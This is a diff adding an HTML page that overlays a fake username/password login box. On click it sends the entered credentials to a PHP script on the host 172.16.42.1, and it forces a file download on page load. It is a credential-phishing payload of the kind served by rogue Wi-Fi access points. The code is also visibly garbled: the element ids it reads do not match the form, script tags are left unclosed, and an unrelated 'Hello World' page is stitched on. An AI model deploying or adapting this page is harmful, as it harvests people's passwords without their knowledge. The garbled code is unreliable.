@@ -1,0 +1,45 @@
+<html>
+<body>
+
+        <div style= 'position: fixed; top: 20px; left: 20px;  height: 200px;background:white;color:black'>
+
+        <form>
+        Username : <input  type='text'  id='username'>
+        Password : <input  type='text'  id='pass'>
+        <button>Login</button>
+        </form>
+
+        </div>
+
+        <script src='http://172.16.42.1/jquery.min.js'></script>
+
+        <script>
+
+        $('button').click(function(){
+            $.ajax({url: 'http://172.16.42.1/responsePage.php?username='+document.getElementById('hacker').value+'&pass='+document.getElementById('password').value, success: function(result){
+
+            }});
+        });
+<a href="inde.txt" id="attack" download="inde.txt">点击下载</a>
+<script>
+window.onload=function (){
+document.getElementById("attack").click();
+}
+        </script>
+</body>
+</html>
+        <!DOCTYPE html>
+<html>
+<head>
+<script>
+function myFunction()
+{
+alert("Hello World!");
+}
+</script>
+</head>
+
+<body>
+<button onclick="myFunction()">点击这里</button>
+</body>
+</html> 
